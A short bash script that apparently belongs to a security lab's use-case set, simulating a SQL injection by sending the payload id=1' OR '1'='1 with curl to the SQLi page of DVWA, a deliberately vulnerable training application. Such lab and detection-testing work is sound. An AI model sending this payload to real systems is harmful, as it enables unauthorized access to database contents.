#!/bin/bash

set -euo pipefail

echo "[*] UC01: Simulating SQL Injection..."

# You can override these via env vars if needed:
#   DVWA_URL="http://localhost:8080" DVWA_COOKIE="security=low; PHPSESSID=..." ./attack_scripts/uc01_sqli.sh
DVWA_URL="${DVWA_URL:-http://172.30.20.10}"
DVWA_COOKIE="${DVWA_COOKIE:-security=low; PHPSESSID=test}"

curl -sS -v --connect-timeout 3 --max-time 10 \
  "${DVWA_URL}/vulnerabilities/sqli/" \
  --get \
  --data-urlencode "id=1' OR '1'='1" \
  --data-urlencode "Submit=Submit" \
  -H "Cookie: ${DVWA_COOKIE}" \
  -o /dev/null